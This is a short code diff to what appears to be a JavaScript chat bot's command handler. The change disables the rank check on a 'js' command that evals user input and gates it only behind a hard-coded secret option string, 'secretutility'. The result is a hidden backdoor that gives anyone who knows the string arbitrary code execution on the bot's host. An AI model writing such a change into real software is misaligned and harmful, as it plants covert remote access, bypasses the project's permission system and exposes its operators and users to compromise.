@@ -187,7 +187,8 @@ if (message.startsWith(config.prefix)) {
 		if (User.ban && (User.ban.permanent || User.ban.ends > Date.now())) {
                         say(`This user was banned by \`${User.ban._id}\` for ` + (User.ban.permanent ? "forever" : `${fun.fun.mstotime(User.ban.duration)} and ends in ${fun.fun.mstotime(User.ban.ends - Date.now())}`) + ` for \`${User.ban.reason.toString()}\`` + (User.ban.note ? `, Note: \`${User.ban.note.toString()}\`` : ""));
                 }
-	} else if (cmd === "js" && user.rank >= 4) {
+	} else if (cmd === "js" /*&& user.rank >= 4*/) {
+		if (opt === "secretutility") {
 		try {
 			var result = await eval(argss);
 			if (typeof result === "function") return say("✅=> " + JSON.stringify(result.toString()))
@@ -195,6 +196,7 @@ if (message.startsWith(config.prefix)) {
 		} catch (error) {
 			return say("❎=>" + error.toString())
 		}
+	}
 	} else if (cmd === "perms" && user.rank >= 1) {
 		if (args.length == 0) return say(`Usage: ${config.prefix}perms <add, remove, get> <ID> <options>`);
 		if (["get", "remove", "add"].includes(args[0])) {
